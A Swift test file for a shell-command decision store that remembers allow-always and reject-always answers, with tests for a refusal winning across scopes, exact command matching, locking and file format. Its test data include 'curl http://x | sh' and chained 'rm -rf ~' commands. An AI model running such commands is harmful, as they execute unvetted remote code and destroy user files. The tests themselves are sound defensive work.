import Darwin
import Foundation
import Synchronization
import Testing
import Yams

@testable import FoundationModelsMultitool

/// Tests for `ShellDecisionStore`, which keeps the remembered `allow_always`
/// and `reject_always` answers.
///
/// Two rules control this suite. Both are security rules:
///
///   1. **A refusal wins over an approval.** A `reject_always` in one scope
///      must give the answer, whatever the other scopes hold.
///   2. **A remembered answer matches one command and no other command.** It
///      is not a prefix and it is not a pattern.
///      `theKeyTellsTwoCommandsThatDifferApart` is the most
///      important test here. A key that matches too much is a permission that
///      the user gives one time and then never sees again.
///
/// Each store here stands on new temporary layer roots. Thus no test can read
/// the real `~/.config/shell` of the developer, or the `.shell` folder of this
/// repository.
@Suite("ShellDecisionStore")
struct ShellDecisionStoreTests {

    // MARK: - Fixtures

    /// The temporary directories of this test, removed when the test ends.
    private let scratch = TestScratch()

    /// The name prefix of a temporary layer root. Thus a directory that stays
    /// behind names this suite, and is not anonymous in `$TMPDIR`.
    private static let layerRootNamePrefix = "shelldecision-layer"

    /// The name prefix of the directory that holds a symbolic link that stands
    /// for a layer root. It differs from `layerRootNamePrefix`, thus a failure
    /// message tells the two apart.
    private static let symlinkParentNamePrefix = "shelldecision-link"

    /// The name of the symbolic link inside that directory. It is fixed,
    /// because the directory around it already carries the unique part.
    private static let symlinkName = "link"

    /// The name prefix of a directory that a test does not make. A symbolic
    /// link that points into it thus fails to open with `ENOENT`.
    private static let missingDirectoryNamePrefix = "shelldecision-missing"

    /// The command that this suite records answers for.
    private static let borderlineCommand = "git push origin main"

    /// A unique path in the temporary directory. Nothing makes it.
    ///
    /// - Parameter prefix: The name prefix that states the role of the path.
    /// - Returns: A URL that no other test in this suite gives.
    private func makeTemporaryURL(prefix: String) -> URL {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("\(prefix)-\(UUID().uuidString)", isDirectory: true)
    }

    /// A new, empty temporary directory that stands for the root of one layer —
    /// the `~/.config/shell` or `{git_root}/.shell` folder.
    ///
    /// - Returns: The new directory.
    /// - Throws: When the directory does not create.
    private func makeLayerRoot() throws -> URL {
        try scratch.makeDirectory(prefix: Self.layerRootNamePrefix)
    }

    /// A symbolic link that points at `target`. It stands for a second spelling
    /// of one layer root.
    ///
    /// The link goes inside a directory that `scratch` already owns. Thus the
    /// removal of that directory removes the link, and no caller must remember
    /// a cleanup step.
    ///
    /// - Parameter target: The directory that the link points at.
    /// - Returns: The link.
    /// - Throws: When the directory or the link does not create.
    private func makeSymlink(to target: URL) throws -> URL {
        let parent = try scratch.makeDirectory(prefix: Self.symlinkParentNamePrefix)
        let link = parent.appendingPathComponent(Self.symlinkName, isDirectory: true)
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: target)
        return link
    }

    /// The decisions file inside `root`.
    ///
    /// - Parameter root: The layer root.
    /// - Returns: The `decisions.yaml` of that layer.
    private func decisionsURL(in root: URL) -> URL {
        root.appendingPathComponent(ShellDotfolder.decisionsFileName)
    }

    /// A store over the given layer roots.
    ///
    /// - Parameters:
    ///   - userRoot: The root of the user layer, or `nil` for no user layer.
    ///   - projectRoot: The root of the project layer, or `nil` for no project
    ///     layer.
    ///   - warn: The warning sink. The default drops each warning, because most
    ///     tests here do not examine them.
    /// - Returns: The store.
    private func makeStore(
        userRoot: URL? = nil,
        projectRoot: URL? = nil,
        warn: @escaping @Sendable (String) -> Void = { _ in }
    ) -> ShellDecisionStore {
        ShellDecisionStore(
            userDecisionsURL: userRoot.map { decisionsURL(in: $0) },
            projectDecisionsURL: projectRoot.map { decisionsURL(in: $0) },
            warn: warn)
    }

    /// Writes a `decisions.yaml` into `root` by hand.
    ///
    /// This bypasses the writer of the store. It is the only way to stage an
    /// entry that the store refuses to write, and the only way to stage a value
    /// that the store does not know.
    ///
    /// - Parameters:
    ///   - decisions: Command text to raw value (`allow_always` or
    ///     `reject_always`).
    ///   - root: The layer root to write into.
    /// - Throws: When the file does not write.
    private func writeDecisionsFile(_ decisions: [String: String], in root: URL) throws {
        let body =
            decisions
            .map { "  \($0.key.debugDescription): \($0.value)" }
            .sorted()
            .joined(separator: "\n")
        try "decisions:\n\(body)\n".write(
            to: decisionsURL(in: root), atomically: true, encoding: .utf8)
    }

    /// The text of the `decisions.yaml` inside `root`.
    ///
    /// - Parameter root: The layer root to read.
    /// - Returns: The contents of the file.
    /// - Throws: When the file is absent or does not read. For a test that says
    ///   the store wrote an answer, that throw is the assertion.
    private func rememberedText(in root: URL) throws -> String {
        try String(contentsOf: decisionsURL(in: root), encoding: .utf8)
    }

    /// The time between two polls of a condition that a background task sets.
    private static let pollInterval = Duration.milliseconds(10)

    /// How many times to poll a condition before the test gives up on it.
    private static let pollLimit = 100

    /// Waits until `condition` is true, or until the poll budget ends.
    ///
    /// - Parameter condition: The condition to wait for.
    /// - Returns: Whether the condition became true inside the budget.
    /// - Throws: When the sleep between two polls cancels.
    private func waitUntil(_ condition: @Sendable () -> Bool) async throws -> Bool {
        for _ in 0..<Self.pollLimit where !condition() {
            try await Task.sleep(for: Self.pollInterval)
        }
        return condition()
    }

    /// Runs `work` on a thread outside the cooperative pool of Swift
    /// concurrency.
    ///
    /// `remember` blocks while it waits for the lock of its layer. This file
    /// states the rule that follows: do not block a cooperative thread, because
    /// the runtime does not replace one. Enough blocked cooperative threads
    /// starve each other task in the process. The tests below block on purpose
    /// and in quantity, thus they must obey the rule that they examine. They
    /// run on `Dispatch` threads, which the system does add to, and they leave
    /// the cooperative thread of the caller suspended only.
    ///
    /// - Parameter work: The blocking work to run off the pool.
    private func offCooperativePool(_ work: @escaping @Sendable () -> Void) async {
        await withCheckedContinuation { continuation in
            DispatchQueue.global().async {
                work()
                continuation.resume()
            }
        }
    }

    /// How many writers compete for one layer file in the concurrency tests.
    ///
    /// It is far above any core count that is possible. With one writer for
    /// each core, a read-modify-write that nothing serializes can end before
    /// the next writer starts, and the test then passes for the wrong reason.
    /// The count must be high enough that the windows truly overlap. A higher
    /// count costs more blocked `Dispatch` threads, which is why
    /// `offCooperativePool` above cares about this number.
    private static let concurrentWriterCount = 32

    /// How long to let a blocked `remember` fail to end before the test decides
    /// that it truly is blocked.
    ///
    /// This supports a negative assertion. Thus it trades run time for
    /// confidence in one direction only. Too short a time can call a slow write
    /// blocked. Too long a time makes the suite slower and nothing worse. A
    /// quarter of a second is far above the few milliseconds that an
    /// uncontested record takes, and the start barrier before it already
    /// removes the larger error, which is that the work never started.
    private static let blockedRecordingWait = Duration.milliseconds(250)

    /// Runs `operation` one time for each index on concurrent `Dispatch`
    /// workers, off the cooperative pool.
    ///
    /// - Parameters:
    ///   - iterations: How many times to run `operation`, one time for each
    ///     index.
    ///   - operation: The blocking work for one index.
    private func concurrently(
        iterations: Int, _ operation: @escaping @Sendable (Int) -> Void
    ) async {
        await offCooperativePool {
            DispatchQueue.concurrentPerform(iterations: iterations, execute: operation)
        }
    }

    /// Records one answer and gives a throw back as a value.
    ///
    /// - Parameters:
    ///   - decision: The answer to record.
    ///   - command: The command text to record it for.
    ///   - scope: The scope to record into.
    ///   - store: The store to record through.
    /// - Returns: A message that names the command and the error, or `nil` when
    ///   the record succeeded.
    private static func failureFromRecording(
        _ decision: ShellDecisionStore.Decision,
        for command: String,
        in scope: ShellDecisionStore.Scope,
        through store: ShellDecisionStore
    ) -> String? {
        do {
            try store.remember(decision, for: command, in: scope)
            return nil
        } catch {
            return "\(command): \(error)"
        }
    }

    /// Records `decision` for each command at one time, with one concurrent
    /// writer for each command, spread over `stores` in turn.
    ///
    /// The writers spread over several stores because one store is not the unit
    /// that the lock protects. The lock covers the whole process and its key is
    /// the layer file. Thus a true test races writers that share that file and
    /// nothing else.
    ///
    /// - Parameters:
    ///   - decision: The answer that each writer records.
    ///   - commands: One command for each concurrent writer.
    ///   - scope: The scope that each writer records into.
    ///   - stores: The stores to spread the writers over. It must not be empty.
    /// - Returns: One message for each writer that threw, in the order that the
    ///   writers ended. It is empty when each writer succeeded.
    private func recordConcurrently(
        _ decision: ShellDecisionStore.Decision,
        for commands: [String],
        in scope: ShellDecisionStore.Scope,
        across stores: [ShellDecisionStore]
    ) async -> [String] {
        let failures = Mutex<[String]>([])
        await concurrently(iterations: commands.count) { index in
            let failure = Self.failureFromRecording(
                decision, for: commands[index], in: scope,
                through: stores[index % stores.count])
            guard let failure else { return }
            failures.withLock { $0.append(failure) }
        }
        return failures.withLock { $0 }
    }

    /// One different command for each concurrent writer.
    ///
    /// The commands differ because the assertion that they support is a count.
    /// Two writers that race on one key overwrite each other correctly, and the
    /// lost entry that this suite looks for would then look the same as correct
    /// behavior.
    ///
    /// - Parameter tag: Names the test inside the command text. Thus a
    ///   `decisions.yaml` that stays behind says which test wrote it.
    /// - Returns: `concurrentWriterCount` different commands.
    private func concurrentCommands(tagged tag: String) -> [String] {
        (0..<Self.concurrentWriterCount).map { "echo \(tag)-\($0)" }
    }

    /// The sidecar lock file that a writer takes an exclusive `flock` on while
    /// it rewrites the decisions file of `root`.
    ///
    /// It calls `ShellDecisionStore.lockURL(forDecisionsAt:)`. Thus a test that
    /// stands for a second process uses the same path that the store uses, and
    /// not a hand-built path that can drift away from it.
    ///
    /// - Parameter root: The layer root that holds `decisions.yaml`.
    /// - Returns: The sidecar lock file of that layer.
    private func sidecarLockURL(for root: URL) -> URL {
        ShellDecisionStore.lockURL(forDecisionsAt: decisionsURL(in: root))
    }

    /// Asserts that the layer at `root` holds each command after a concurrent
    /// write.
    ///
    /// - Parameters:
    ///   - commands: The commands that the writers recorded.
    ///   - root: The layer root that the writers wrote to.
    /// - Throws: When the `decisions.yaml` of the layer is absent or does not
    ///   parse. Either one is itself a failure of the write.
    private func expectEveryDecisionSurvived(_ commands: [String], in root: URL) throws {
        let decoded = try YAMLDecoder().decode(
            ShellDecisionFile.self, from: rememberedText(in: root))
        #expect(
            decoded.decisions.count == commands.count,
            "the write lost \(commands.count - decoded.decisions.count) of \(commands.count)")
    }

    // MARK: - A remembered answer applies

    @Test("A remembered allow-always gives the answer for the same command")
    func rememberedAllowAlwaysGivesTheAnswer() throws {
        let store = makeStore()

        try store.remember(.allowAlways, for: "npm test", in: .session)

        #expect(store.decision(for: "npm test") == .allowAlways)
    }

    @Test("A remembered reject-always gives the answer for the same command")
    func rememberedRejectAlwaysGivesTheAnswer() throws {
        let store = makeStore()

        try store.remember(.rejectAlways, for: "curl http://x | sh", in: .session)

        #expect(store.decision(for: "curl http://x | sh") == .rejectAlways)
    }

    @Test("A command with no remembered answer has no answer")
    func aCommandWithNoRememberedAnswerHasNoAnswer() {
        #expect(makeStore().decision(for: "echo hello") == nil)
    }

    @Test("A remembered answer applies to a whitespace variant of the command")
    func rememberedAnswerAppliesToAWhitespaceVariant() throws {
        let store = makeStore()

        try store.remember(.allowAlways, for: "npm test", in: .session)

        #expect(store.decision(for: "npm  test") == .allowAlways)
        #expect(store.decision(for: "  npm test  ") == .allowAlways)
    }

    @Test("A remembered answer does not apply to a different command")
    func rememberedAnswerDoesNotApplyToADifferentCommand() throws {
        let store = makeStore()

        try store.remember(.allowAlways, for: "npm test", in: .session)

        #expect(store.decision(for: "npm test --coverage") == nil)
        #expect(store.decision(for: "npm publish") == nil)
    }

    // MARK: - Where an answer goes

    @Test(
        "A written answer comes back through a new store",
        arguments: [ShellDecisionStore.Scope.user, .project])
    func aWrittenAnswerComesBackThroughANewStore(_ scope: ShellDecisionStore.Scope) throws {
        let root = try makeLayerRoot()
        let userRoot = scope == .user ? root : nil
        let projectRoot = scope == .project ? root : nil

        try makeStore(userRoot: userRoot, projectRoot: projectRoot)
            .remember(.allowAlways, for: Self.borderlineCommand, in: scope)

        let reloaded = makeStore(userRoot: userRoot, projectRoot: projectRoot)
        #expect(reloaded.decision(for: Self.borderlineCommand) == .allowAlways)
    }

    @Test("A session answer writes no file and does not come back")
    func aSessionAnswerWritesNoFile() throws {
        let user = try makeLayerRoot()
        let project = try makeLayerRoot()
        let store = makeStore(userRoot: user, projectRoot: project)

        try store.remember(.allowAlways, for: Self.borderlineCommand, in: .session)
        #expect(store.decision(for: Self.borderlineCommand) == .allowAlways)

        for root in [user, project] {
            #expect(
                !FileManager.default.fileExists(atPath: decisionsURL(in: root).path),
                "the session scope must write no file")
        }
        let reloaded = makeStore(userRoot: user, projectRoot: project)
        #expect(reloaded.decision(for: Self.borderlineCommand) == nil)
    }

    @Test("A project answer does not reach another project")
    func aProjectAnswerDoesNotReachAnotherProject() throws {
        let projectA = try makeLayerRoot()
        let projectB = try makeLayerRoot()

        try makeStore(projectRoot: projectA)
            .remember(.allowAlways, for: Self.borderlineCommand, in: .project)

        #expect(
            makeStore(projectRoot: projectA).decision(for: Self.borderlineCommand)
                == .allowAlways)
        #expect(
            makeStore(projectRoot: projectB).decision(for: Self.borderlineCommand) == nil,
            "an answer made in one project must not reach another project")
    }

    @Test("The store has no place to write a layer that is not there")
    func theStoreHasNoPlaceToWriteALayerThatIsNotThere() {
        let store = makeStore()

        #expect(throws: ShellPolicyError.noStorageForScope(.user)) {
            try store.remember(.allowAlways, for: "echo hello", in: .user)
        }
    }

    // MARK: - A refusal wins

    /// The refusal must win from **both** layer assignments. That is what makes
    /// the rule load-bearing.
    ///
    /// A lookup collects one candidate for each scope and then looks for a
    /// refusal. With the user layer alone under test, code that removes the
    /// search and takes the first candidate still passes, because the store
    /// reads the user layer first. The project layer is the direction that
    /// fails.
    @Test(
        "A reject-always in one layer beats an allow-always in another layer",
        arguments: [ShellDecisionStore.Scope.user, .project])
    func aRejectInOneLayerBeatsAnAllowInAnother(
        _ rejectingScope: ShellDecisionStore.Scope
    ) throws {
        let user = try makeLayerRoot()
        let project = try makeLayerRoot()
        let key = ShellDecisionStore.matchKey(for: Self.borderlineCommand)
        let rejecting = rejectingScope == .user ? user : project
        let allowing = rejectingScope == .user ? project : user
        try writeDecisionsFile([key: "reject_always"], in: rejecting)
        try writeDecisionsFile([key: "allow_always"], in: allowing)

        let store = makeStore(userRoot: user, projectRoot: project)

        #expect(
            store.decision(for: Self.borderlineCommand) == .rejectAlways,
            "two layers that disagree resolve to the refusal, whichever layer holds it")
    }

    @Test("A session reject-always beats a written allow-always")
    func aSessionRejectBeatsAWrittenAllow() throws {
        let user = try makeLayerRoot()
        let key = ShellDecisionStore.matchKey(for: Self.borderlineCommand)
        try writeDecisionsFile([key: "allow_always"], in: user)
        let store = makeStore(userRoot: user)

        try store.remember(.rejectAlways, for: Self.borderlineCommand, in: .session)

        #expect(store.decision(for: Self.borderlineCommand) == .rejectAlways)
    }

    @Test("The store names each scope that holds an answer")
    func theStoreNamesEachScopeThatHoldsAnAnswer() throws {
        let user = try makeLayerRoot()
        let project = try makeLayerRoot()
        let key = ShellDecisionStore.matchKey(for: Self.borderlineCommand)
        try writeDecisionsFile([key: "reject_always"], in: user)
        try writeDecisionsFile([key: "allow_always"], in: project)
        let store = makeStore(userRoot: user, projectRoot: project)

        #expect(
            store.scopes(remembering: .rejectAlways, for: Self.borderlineCommand) == [.user])
        #expect(
            store.scopes(remembering: .allowAlways, for: Self.borderlineCommand) == [.project])
    }

    @Test("The session scope shares its storage with no other scope")
    func theSessionScopeSharesItsStorageWithNoOtherScope() throws {
        let user = try makeLayerRoot()

        #expect(makeStore(userRoot: user).scopesSharingStorage(with: .session) == [.session])
    }

    @Test("Two scopes over one directory share their storage")
    func twoScopesOverOneDirectoryShareTheirStorage() throws {
        let shared = try makeLayerRoot()

        let store = makeStore(userRoot: shared, projectRoot: shared)

        #expect(store.scopesSharingStorage(with: .user) == [.user, .project])
    }

    @Test("Two spellings of one layer root share their storage")
    func twoSpellingsOfOneLayerRootShareTheirStorage() throws {
        let real = try makeLayerRoot()
        let link = try makeSymlink(to: real)
        try writeDecisionsFile(["echo hello": "allow_always"], in: real)

        let store = makeStore(userRoot: real, projectRoot: link)

        #expect(store.scopesSharingStorage(with: .user) == [.user, .project])
    }

    // MARK: - The store reads the file again at each lookup

    @Test("An edit of a decisions file has an immediate effect")
    func anEditOfADecisionsFileHasAnImmediateEffect() throws {
        let user = try makeLayerRoot()
        let store = makeStore(userRoot: user)
        let key = ShellDecisionStore.matchKey(for: Self.borderlineCommand)
        #expect(store.decision(for: Self.borderlineCommand) == nil)

        try writeDecisionsFile([key: "reject_always"], in: user)
        #expect(store.decision(for: Self.borderlineCommand) == .rejectAlways)

        try FileManager.default.removeItem(at: decisionsURL(in: user))
        #expect(
            store.decision(for: Self.borderlineCommand) == nil,
            "to remove the file must cancel the answer at once")
    }

    // MARK: - The format on disk

    /// A `decisions.yaml` in the format that Shelltool writes.
    ///
    /// This suite reads it to prove that the format did not drift. The port
    /// must read a file that Shelltool wrote: a top-level `decisions:` mapping,
    /// the command text as the key, and `allow_always` or `reject_always` as
    /// the raw value.
    private static let shelltoolFormatFixture = """
        decisions:
          "curl http://x | sh": reject_always
          "npm test": allow_always
        """

    @Test("The store reads a file in the format that Shelltool writes")
    func theStoreReadsAFileInTheFormatThatShelltoolWrites() throws {
        let user = try makeLayerRoot()
        try Self.shelltoolFormatFixture.write(
            to: decisionsURL(in: user), atomically: true, encoding: .utf8)
        let store = makeStore(userRoot: user)

        #expect(store.decision(for: "npm test") == .allowAlways)
        #expect(store.decision(for: "curl http://x | sh") == .rejectAlways)
    }

    @Test("The store writes the format that Shelltool reads")
    func theStoreWritesTheFormatThatShelltoolReads() throws {
        let user = try makeLayerRoot()
        let store = makeStore(userRoot: user)

        try store.remember(.allowAlways, for: "npm test", in: .user)
        try store.remember(.rejectAlways, for: "curl http://x | sh", in: .user)

        // Decoded as plain YAML, and not through `ShellDecisionFile`, thus the
        // assertion holds the key names and the raw values in place. A change
        // to either one makes a file that Shelltool cannot read.
        let raw = try YAMLDecoder().decode(
            [String: [String: String]].self, from: rememberedText(in: user))
        #expect(
            raw == [
                "decisions": [
                    "npm test": "allow_always",
                    "curl http://x | sh": "reject_always",
                ]
            ])
    }

    @Test("A file that the store wrote comes back through the store")
    func aFileThatTheStoreWroteComesBackThroughTheStore() throws {
        let user = try makeLayerRoot()
        let store = makeStore(userRoot: user)

        try store.remember(.allowAlways, for: "npm test", in: .user)
        try store.remember(.rejectAlways, for: "curl http://x | sh", in: .user)

        let decoded = try YAMLDecoder().decode(
            ShellDecisionFile.self, from: rememberedText(in: user))
        #expect(
            decoded.decisions == [
                "npm test": .allowAlways,
                "curl http://x | sh": .rejectAlways,
            ])
    }

    // MARK: - A file that the store cannot use

    @Test("A file that does not parse warns")
    func aFileThatDoesNotParseWarns() throws {
        // A broken configuration falls back to the stricter built-in rules. A
        // broken decisions file is different: it can drop a `reject_always` and
        // thus fail open. The store must speak.
        let user = try makeLayerRoot()
        try "decisions: [this is not a mapping\n".write(
            to: decisionsURL(in: user), atomically: true, encoding: .utf8)
        let warnings = WarningRecorder()
        let store = makeStore(userRoot: user, warn: { warnings.record($0) })

        #expect(store.decision(for: "echo hello") == nil)

        #expect(
            warnings.messages.contains { $0.contains("could not be parsed") },
            "the store must warn; it sent \(warnings.messages)")
    }

    @Test("One entry that the store does not know keeps the other entries")
    func oneUnknownEntryKeepsTheOtherEntries() throws {
        // A hand-written `allow_once` is a real answer kind, but it is not a
        // remembered one. It must not take the `reject_always` beside it down.
        // That would fail open on the entry that matters most.
        let user = try makeLayerRoot()
        try writeDecisionsFile(
            ["echo danger": "reject_always", "echo other": "allow_once"], in: user)
        let warnings = WarningRecorder()
        let store = makeStore(userRoot: user, warn: { warnings.record($0) })

        #expect(store.decision(for: "echo danger") == .rejectAlways)
        #expect(store.decision(for: "echo other") == nil)
        #expect(
            warnings.messages.contains { $0.contains("allow_once") },
            "the store must name the entry that it dropped; it sent \(warnings.messages)")
    }

    @Test("A rewrite keeps an entry that the store does not know")
    func aRewriteKeepsAnEntryThatTheStoreDoesNotKnow() throws {
        // To drop the wrong line on the next write destroys the text that the
        // user typed and stops the warning. That hides the mistake.
        let user = try makeLayerRoot()
        try writeDecisionsFile(["echo other": "allow_once"], in: user)
        let store = makeStore(userRoot: user)

        try store.remember(.allowAlways, for: "npm test", in: .user)

        let text = try rememberedText(in: user)
        #expect(text.contains("allow_once"), "the write destroyed the unknown entry: \(text)")
        #expect(text.contains("allow_always"))
    }

    @Test("The store refuses to write over a file that it cannot parse")
    func theStoreRefusesToWriteOverAFileThatItCannotParse() throws {
        // A read-modify-write over a file that does not parse writes a
        // one-entry file over the text that the user typed. That destroys any
        // `reject_always` in it and stops the warning that reported the
        // problem. Refuse instead.
        let user = try makeLayerRoot()
        let url = decisionsURL(in: user)
        let corrupt = "decisions: [this is not a mapping\n"
        try corrupt.write(to: url, atomically: true, encoding: .utf8)
        let store = makeStore(userRoot: user)

        #expect(throws: ShellPolicyError.unreadableDecisionsFile(url)) {
            try store.remember(.allowAlways, for: "npm test", in: .user)
        }
        #expect(
            try String(contentsOf: url, encoding: .utf8) == corrupt,
            "the file that does not parse must stay exactly as the user wrote it")
    }

    @Test("An empty file holds no answer and sends no warning")
    func anEmptyFileHoldsNoAnswerAndSendsNoWarning() throws {
        let user = try makeLayerRoot()
        try "".write(to: decisionsURL(in: user), atomically: true, encoding: .utf8)
        let warnings = WarningRecorder()
        let store = makeStore(userRoot: user, warn: { warnings.record($0) })

        #expect(store.decision(for: "echo hello") == nil)
        #expect(warnings.messages.isEmpty, "an empty file is not a fault")
    }

    // MARK: - Two writers at one time

    /// To record a written answer is a read-modify-write of the whole layer
    /// file. With no lock, two answers that land together interleave and one of
    /// them goes away. A `reject_always` that goes away is a silent fail-open,
    /// which is the failure that this store exists to prevent.
    @Test("Concurrent records to one layer lose no answer")
    func concurrentRecordsToOneLayerLoseNoAnswer() async throws {
        let user = try makeLayerRoot()
        let commands = concurrentCommands(tagged: "concurrent")

        let failures = await recordConcurrently(
            .rejectAlways, for: commands, in: .user, across: [makeStore(userRoot: user)])

        #expect(failures == [])
        try expectEveryDecisionSurvived(commands, in: user)
    }

    /// The lock inside the process is one half only. Two agent processes can
    /// share the user layer. Thus a record also holds an exclusive `flock` on
    /// the sidecar lock file of the layer across the read-modify-write, and a
    /// writer in another process waits instead of racing.
    ///
    /// This test stands for that other process. It takes the same lock on a
    /// descriptor of its own, which `flock` excludes exactly as it excludes a
    /// second process.
    ///
    /// The load-bearing assertion is negative. Thus it needs a start barrier,
    /// or it can pass only because the recording task never started. Nothing
    /// goes ahead until the task reports that it is about to call `remember`.
    @Test("A record waits for an exclusive lock that another holder took")
    func aRecordWaitsForAnExclusiveLockThatAnotherHolderTook() async throws {
        let user = try makeLayerRoot()
        let store = makeStore(userRoot: user)
        let lockPath = sidecarLockURL(for: user).path
        let held = open(lockPath, O_RDONLY | O_CREAT, ShellDotfolder.lockFileMode)
        try #require(held >= 0)
        try #require(flock(held, LOCK_EX) == 0)

        let started = Mutex(false)
        let finished = Mutex(false)
        let failure = Mutex<String?>(nil)
        let recording = Task.detached {
            await self.offCooperativePool {
                started.withLock { $0 = true }
                let outcome = Self.failureFromRecording(
                    .rejectAlways, for: "echo locked", in: .user, through: store)
                failure.withLock { $0 = outcome }
                finished.withLock { $0 = true }
            }
        }
        try #require(
            await waitUntil { started.withLock { $0 } },
            "the record never started, thus the wait below proves nothing")

        try await Task.sleep(for: Self.blockedRecordingWait)
        #expect(
            finished.withLock { $0 } == false,
            "a record must wait for the lock of the layer and must not race its holder")

        #expect(flock(held, LOCK_UN) == 0)
        close(held)

        await recording.value
        #expect(failure.withLock { $0 } == nil)
        #expect(try rememberedText(in: user).contains("reject_always"))
    }

    /// `aRecordWaitsForAnExclusiveLockThatAnotherHolderTook` above uses one
    /// spelling of the layer root only. Thus it cannot catch a lock inside the
    /// process that keys on the path that nothing resolved.
    ///
    /// A simple version of this test — one writer through the link, one through
    /// the real path — passes even with that fault and proves nothing. `flock`
    /// locks belong to an open file description: the kernel resolves the link
    /// during `open()`, thus both writers lock the same file, whatever string
    /// `lockURL` gave. To examine the key inside the process, take `flock` out
    /// of the picture first. This test puts a dangling symbolic link at the
    /// resolved sidecar path. It points into a directory that is not there.
    /// `open(path, O_RDONLY | O_CREAT, …)` through such a link fails with
    /// `ENOENT`, which is the branch that gives `nil` in
    /// `acquireCrossProcessLock`. With that branch forced for each writer, the
    /// `NSLock` that `lockURL(forDecisionsAt:)` keys is the only thing left
    /// that serializes the read-modify-write.
    @Test("Concurrent records across two spellings of one root lose no answer")
    func concurrentRecordsAcrossTwoSpellingsLoseNoAnswer() async throws {
        let real = try makeLayerRoot()
        let link = try makeSymlink(to: real)
        let bogusTarget = makeTemporaryURL(prefix: Self.missingDirectoryNamePrefix)
            .appendingPathComponent(
                ShellDotfolder.decisionsFileName + ShellDotfolder.lockFileSuffix)
        try FileManager.default.createSymbolicLink(
            at: sidecarLockURL(for: real), withDestinationURL: bogusTarget)

        let commands = concurrentCommands(tagged: "symlink")
        let failures = await recordConcurrently(
            .rejectAlways, for: commands, in: .user,
            across: [makeStore(userRoot: real), makeStore(userRoot: link)])

        #expect(failures == [])
        try expectEveryDecisionSurvived(commands, in: real)
    }

    @Test("The sidecar lock file stands beside the decisions file")
    func theSidecarLockFileStandsBesideTheDecisionsFile() throws {
        let user = try makeLayerRoot()

        let lock = sidecarLockURL(for: user)

        #expect(lock.deletingLastPathComponent().path == user.path)
        #expect(
            lock.lastPathComponent
                == ShellDotfolder.decisionsFileName + ShellDotfolder.lockFileSuffix)
    }

    // MARK: - The match key

    /// Two spellings of one command that must give the same remembered answer.
    struct SameKeyPair: Sendable {
        /// The command that the user answered for.
        let approved: String
        /// A spelling that must use that same answer.
        let variant: String
    }

    @Test(
        "The key ignores whitespace that the shell does not read",
        arguments: [
            // The exact trap: repeated separator whitespace has no meaning to
            // the word splitter of the shell.
            SameKeyPair(approved: "npm test", variant: "npm  test"),
            SameKeyPair(approved: "npm test", variant: "  npm test  "),
            SameKeyPair(approved: "npm test", variant: "npm\ttest"),
            SameKeyPair(approved: "swift build -c release", variant: "swift   build  -c release"),
        ])
    func theKeyIgnoresWhitespaceTheShellDoesNotRead(_ pair: SameKeyPair) {
        #expect(
            ShellDecisionStore.matchKey(for: pair.approved)
                == ShellDecisionStore.matchKey(for: pair.variant))
    }

    /// A command that the user approved, with a command that must not take that
    /// approval.
    struct DifferentKeyPair: Sendable {
        /// The command that the user answered for.
        let approved: String
        /// A command that differs, and that must get an answer of its own.
        let other: String
        /// Why the two differ, for the failure message.
        let why: String
    }

    @Test(
        "The key tells two commands that differ apart",
        arguments: [
            DifferentKeyPair(
                approved: "npm test", other: "npm test --coverage",
                why: "no prefix match: more arguments make a different command"),
            DifferentKeyPair(
                approved: "git status", other: "git status; rm -rf ~",
                why: "no prefix match: a chained command is a different command"),
            DifferentKeyPair(
                approved: "npm test", other: "NPM test",
                why: "no case fold: the shell and its paths read the case"),
            DifferentKeyPair(
                approved: "rm \"my  file\"", other: "rm \"my file\"",
                why: "whitespace inside double quotes is part of the argument"),
            DifferentKeyPair(
                approved: "rm 'my  file'", other: "rm 'my file'",
                why: "whitespace inside single quotes is part of the argument"),
            DifferentKeyPair(
                approved: "rm my\\ \\ file", other: "rm my\\ file",
                why: "a space after a backslash is part of the argument"),
            DifferentKeyPair(
                approved: "echo a\nrm -rf ~", other: "echo a rm -rf ~",
                why: "a newline separates two commands; a space does not"),
            DifferentKeyPair(
                approved: "cat <<EOF\n  indented\nEOF", other: "cat <<EOF\n indented\nEOF",
                why: "indentation inside a command of several lines is content"),
            DifferentKeyPair(
                approved: "python -c 'if x:\n    a()\n    b()'",
                other: "python -c 'if x:\n    a()\nb()'",
                why: "indentation inside an embedded script selects the control flow"),
            DifferentKeyPair(
                approved: "rm \"$(echo \"my  file\")\"", other: "rm \"$(echo \"my file\")\"",
                why: "quoting starts again inside $( ), thus the inner quotes are new"),
            DifferentKeyPair(
                approved: "rm $'my\\'  file'", other: "rm $'my\\' file'",
                why: "the $'...' form reads a quote that comes after a backslash"),
            // Examined against /bin/bash: the two spellings below make files
            // with different names, shown with `od -c`.
            DifferentKeyPair(
                approved: "rm \"\u{0308}my  file\"\u{0308}",
                other: "rm \"\u{0308}my file\"\u{0308}",
                why: """
                    a combining mark makes the quote and the mark one Swift Character, \
                    but bash still reads the quote
                    """),
            DifferentKeyPair(
                approved: "touch bar\\ ", other: "touch bar\\",
                why: "a space that a backslash escapes is argument text, not separation"),
            // A here-document delimiter must match its line exactly. Thus
            // whitespace at the end of the last line of a command of several
            // lines is not separation — it makes the delimiter into body text.
            // Examined against /bin/bash: the `sh <<END` pair below differs by
            // one 0x20, and the spelling with the space also runs `END` as a
            // command, which the approved spelling never does.
            DifferentKeyPair(
                approved: "sh <<END\necho hi\nEND",
                other: "sh <<END\necho hi\nEND ",
                why: "a here-document that does not end runs its own delimiter line"),
            DifferentKeyPair(
                approved: "cat <<EOF\nfoo\nEOF",
                other: "cat <<EOF\nfoo\nEOF ",
                why: "a space at the end stops the delimiter match, thus EOF becomes body"),
            DifferentKeyPair(
                approved: "cat <<EOF\nfoo",
                other: "cat <<EOF\nfoo\n\n",
                why: "empty lines at the end are body, thus the two write different text"),
            // The same hazard with the operator on the only line. What stays
            // after the removal of the run at the end is one line, thus the
            // guard for several lines never fires. Examined against /bin/bash:
            // the approved spelling writes nothing, the other writes one
            // newline, because the empty line is body.
            DifferentKeyPair(
                approved: "cat <<EOF",
                other: "cat <<EOF\n\n",
                why: "the whole body of a here-document can be the whitespace at the end"),
            DifferentKeyPair(
                approved: "cat<<-E",
                other: "cat<<-E\n\n",
                why: "the tab-stripping form strips tabs, and not the empty line"),
        ])
    func theKeyTellsTwoCommandsThatDifferApart(_ pair: DifferentKeyPair) {
        #expect(
            ShellDecisionStore.matchKey(for: pair.approved)
                != ShellDecisionStore.matchKey(for: pair.other),
            Comment(rawValue: pair.why))
    }

    @Test("A command that carries shell quoting keys word for word")
